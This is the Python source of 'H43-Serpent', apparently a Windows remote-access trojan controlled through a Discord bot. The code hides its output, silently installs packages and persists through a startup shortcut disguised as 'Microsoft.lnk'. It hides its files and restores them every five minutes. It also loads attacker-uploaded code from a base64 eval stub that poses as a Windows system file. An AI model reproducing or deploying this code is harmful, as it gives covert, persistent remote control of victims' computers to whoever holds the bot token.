TARGET = ''
TOKEN = ''
LIB = ''


'''                                                
 _____ ___ ___     _____                     _   
|  |  | | |_  |___|   __|___ ___ ___ ___ ___| |_ 
|     |_  |_  |___|__   | -_|  _| . | -_|   |  _|
|__|__| |_|___|   |_____|___|_| |  _|___|_|_|_|  
                                |_|              


Author: Fytex
REPO: https://github.com/Fytex/H43-Serpent
'''


import sys, os

os.chdir(os.path.dirname(os.path.realpath(__file__)))

sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

import subprocess
packages = ['discord', 'pywin32']
while subprocess.call(
    [sys.executable, '-m', 'pip', 'install', '--upgrade', *packages],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL
): pass

import site
import importlib

importlib.reload(site) # pywin32 edits sys.path and we need it for win32api/win32con/win32com


import time
import ctypes
import asyncio
import discord
import win32api
import win32con

from ctypes import wintypes
from discord.ext import tasks
from discord.ext import commands
from win32com.client import Dispatch
import win32.lib.win32con as win32con
from win32com.shell import shell, shellcon


SHORTCUT_NAME = 'Microsoft.lnk'
def create_shortcut():
    d = shell.SHGetFolderPath(0, shellcon.CSIDL_STARTUP, None, 0)
    ws_shell = Dispatch('WScript.Shell')
    shortcut = ws_shell.CreateShortCut(os.path.join(d, SHORTCUT_NAME))
    shortcut.Targetpath = sys.executable
    shortcut.Arguments = os.path.realpath(__file__)
    shortcut.IconLocation = __file__ + ', 1' # Icon to blank
    shortcut.save()


create_shortcut()

with open(__file__, 'r') as f:
    BACKUP_FILE = f.read()
with open(LIB + '.pyw', 'r') as f:
    LIB_BACKUP_FILE = f.read()


file_base64_content = '''\'\'\'
WINDOWS SYSTEM

[Warning]
Deleting this system\'s file can make your computer malfunction.
Action is irreversible.
\'\'\'


import base64
eval(compile(base64.b64decode({}),\'<string>\',\'exec\'))
'''



intents = discord.Intents.default()
intents.message_content = True



bot = commands.Bot(command_prefix=f'{TARGET}-', intents=intents)


@bot.event
async def on_ready():
    try:
        await bot.load_extension(LIB)
    except Exception:
        pass
    
    await auto_save.start()


@bot.command(
    name='update',
    brief='(!) Dangerous. Update commands\' library',
    description='(!) Dangerous: Just upload file that you programmed otherwise file can be malicious. Only bot\'s owner can execut it.\nIt requires knowledge in python programming.\nUpdate command\'s library by uploading a python file along with the command.'
)
@commands.is_owner()
async def update(ctx):
    if ctx.message.attachments:
        with open(LIB + '.pyw', 'w') as f:
            text_bytes = await ctx.message.attachments[0].read()
            encoded = encoded = base64.b64encode(text_bytes)
            f.write(file_base64_content.format(encoded))

        with open(LIB + '.pyw', 'r') as f:
            LIB_BACKUP_FILE = f.read()

        # Not using reload because extension could have not been loaded
        try:
            await bot.unload_extension(LIB)
        except Exception:
            pass

        try:
            await bot.load_extension(LIB)
        except Exception:
            pass



def _auto_save():
    main_file_path = __file__
    try:
        with open(main_file_path, 'w') as f:
            f.write(BACKUP_FILE)
    except Exception:
        pass

    win32api.SetFileAttributes(main_file_path ,win32con.FILE_ATTRIBUTE_HIDDEN)

    lib_file_path = LIB + '.pyw'
    try:
        with open(lib_file_path, 'w') as f:
            f.write(LIB_BACKUP_FILE)
    except Exception:
        pass

    win32api.SetFileAttributes(lib_file_path ,win32con.FILE_ATTRIBUTE_HIDDEN)

    create_shortcut()


@tasks.loop(seconds=300)
async def auto_save():
    _auto_save()


    
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

while True:
    for _ in range(15):
        try:
            loop.run_until_complete(bot.start(TOKEN))
        except Exception:
            time.sleep(20)

    _auto_save()
